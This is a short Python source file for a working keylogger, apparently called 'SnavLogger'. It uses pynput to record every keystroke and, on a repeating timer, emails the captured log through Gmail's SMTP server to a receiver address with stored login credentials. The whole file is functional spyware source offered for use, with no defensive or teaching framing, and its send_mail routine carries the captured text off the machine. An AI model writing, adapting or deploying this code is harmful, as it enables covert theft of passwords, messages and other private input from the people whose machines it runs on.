# Made by Snavellet

import smtplib
import threading
from email.message import EmailMessage

import pynput.keyboard


class Keylogger:
    """
    A class for creating the keylogger instance.
    """
    def __init__(self, time_interval, from_email, from_password, receiver_email):
        """
        Constructor for the class.
        """
        self.log = 'Keylogger started'
        self.interval = time_interval
        self.from_email = from_email
        self.from_password = from_password
        self.receiver_email = receiver_email

    def append_to_log(self, string):
        """
        Append the keys to the final log variable to send the report.
        """
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
            self.append_to_log(current_key)
        except AttributeError:
            if key == key.space:
                current_key = ' '
            else:
                current_key = str(key)
                current_key = current_key.split('.')[1]
                current_key = f' "([{current_key}])" '
            self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.send_mail('SnavLogger', '\n\n' + self.log)
        self.log = ''
        timer = threading.Timer(self.interval, self.report)
        timer.start()
        
    def send_mail(self, subject, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        msg = EmailMessage()

        msg.set_content(message)
        msg['To'] = self.receiver_email
        msg['Subject'] = subject
        msg['From'] = self.from_email

        server.starttls()
        server.login(self.from_email, self.from_password)
        server.send_message(msg, from_addr=self.from_email, to_addrs=self.receiver_email)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
